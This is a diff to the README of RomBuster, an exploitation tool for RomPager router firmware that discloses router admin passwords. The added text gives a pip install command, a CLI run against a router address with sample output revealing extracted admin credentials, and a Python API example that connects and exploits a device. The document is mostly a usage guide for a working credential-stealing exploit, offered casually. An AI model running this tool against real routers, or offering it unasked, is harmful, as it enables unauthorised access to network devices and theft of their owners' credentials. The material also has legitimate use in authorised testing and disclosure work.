@@ -1,6 +1,44 @@
-# RomBuster (`Coming soon`)
+# RomBuster
 
 **RomBuster** is a `RomPager` exploitation tool that allows to disclosure network router admin password.
+
+## Installation
+
+```shell
+pip3 install git+https://github.com/EntySec/RomBuster
+```
+
+## RomBuster CLI
+
+Let's hack my router just for fun.
+
+```shell
+rombuster --address 192.168.2.1
+```
+
+**output:**
+
+```shell
+[*] (192.168.2.1) - connecting to device ...
+[*] (192.168.2.1) - accessing device rom ...
+[*] (192.168.2.1) - extracting credentials ...
+[i] (192.168.2.1) - admin:SuperHardPassword999
+```
+
+Oh, looks like it vulnerable to this vulnerability.
+
+## RomBuster
+
+Let's do this again, but through API.
+
+```python
+from rombuster import RomBuster
+
+rombuster = RomBuster()
+
+device = rombuster.connect('192.168.2.1')
+print(rombuster.exploit(device))
+```
 
 ## Vulnerability disclosure
 
